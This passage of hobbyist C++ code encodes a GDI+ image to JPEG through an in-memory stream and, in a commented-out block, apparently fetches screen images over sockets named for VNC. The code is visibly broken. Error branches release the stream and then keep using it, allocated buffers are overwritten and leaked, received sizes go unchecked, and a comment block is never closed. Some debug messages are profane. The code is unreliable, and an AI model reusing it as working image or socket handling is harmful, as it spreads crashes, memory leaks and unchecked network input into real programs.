HRESULT hr =CreateStreamOnHGlobal(NULL, TRUE, &MyPstream);

    
stat = image->Save(MyPstream, &encoderClsid, &encoderParameters);

ULARGE_INTEGER ulnSize;
LARGE_INTEGER lnOffset;
lnOffset.QuadPart = 0;
if(MyPstream->Seek(lnOffset, STREAM_SEEK_END, &ulnSize) != S_OK)
{
    MyPstream->Release();
    
}

// now move the pointer to the beginning of the file

if(MyPstream->Seek(lnOffset, STREAM_SEEK_SET, NULL) != S_OK)
{
    MyPstream->Release();
 
}

 void *ConvertImage=NULL;
  char *pBuff = new char[ulnSize.QuadPart];

        // Read the stream directly into the buffer
        ULONG ulBytesRead;
        if(MyPstream->Read(pBuff, ulnSize.QuadPart, &ulBytesRead) != S_OK)
        {
            MyPstream->Release();
         
        }
        //After reading it to what it needs to be read to then send
    int    Mycount=ulBytesRead;

   IStream* FreshStream=NULL;
hr =CreateStreamOnHGlobal(NULL, TRUE, &FreshStream);
// write peices to stream
FreshStream->Write(pBuff,ulnSize.QuadPart,&ulBytesRead);

Image* FreshImage=new Image(FreshStream);
delete image;
DeleteObject(mgraphics);
DeleteObject(hMymap);
 //  GdiplusShutdown(gdiplusToken);
 return FreshImage;  
}

//HEREHEHREHRHEHRHEHRHERHERHEHRHERHEHRHEHRHEHREHHEHRHEHRHEHEHRHERHRHEHERHREH


/*
	
     // Initialize GDI+.
   GdiplusStartupInput gdiplusStartupInput;
   ULONG_PTR gdiplusToken;
   GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

   CLSID             encoderClsid;
   EncoderParameters encoderParameters;
   ULONG             quality;
   Status            stat;

   // Get an image from the disk.
  // Image* image = new Image(L"Shapes.bmp");
    
    
  
   cout<<"running"<<endl;
    GetEncoderClsid(L"image/jpeg", &encoderClsid);
   encoderParameters.Count = 1;
   encoderParameters.Parameter[0].Guid = EncoderQuality;
   encoderParameters.Parameter[0].Type = EncoderParameterValueTypeLong;
   encoderParameters.Parameter[0].NumberOfValues = 1;
   
   quality = 25;
   sendData(VNCSocks[ID],"GetImage",strlen("GetImage"));
   encoderParameters.Parameter[0].Value = &quality;
   ProcessingImage=1;
   char * input=new char[1000];
   input=recvData(VNCSocks[ID]); //times out 
   cout<<"MesageBack:"<<input<<endl;
   if (!strncmp(input,"SendingData",strlen("SendingData"))){
	   cout<<"Woot getting my image bitch"<<endl;
	
   char * AciiNum=new char[1000];
   AciiNum=recvData(VNCSocks[ID]);
   cout<<"Number of bytes to allocate:"<<AciiNum<<endl;
   ULARGE_INTEGER ulnSize;
   ulnSize.QuadPart=atol(AciiNum);
   char * Imagebuffer=new char[ulnSize.QuadPart];
   Imagebuffer=recvData(VNCSocks[ID]);

     IStream* FreshStream=NULL;
CreateStreamOnHGlobal(NULL, TRUE, &FreshStream);
// write peices to stream
     ULONG ulBytesRead;
FreshStream->Write(Imagebuffer,ulnSize.QuadPart,&ulBytesRead);
cout<<"Read Byte:"<<ulBytesRead<<endl;
FreshImage=new Image(FreshStream);





   }else{
	   cout << "Crap!"<<endl;
   IStream* FreshStream=NULL;
   }
   ProcessingImage=0;
        
 //  GdiplusShutdown(gdiplusToken);
return FreshImage; 
}




/*
TO DO:
Change/Add NetworkCode and add in Ability to transfer images
*/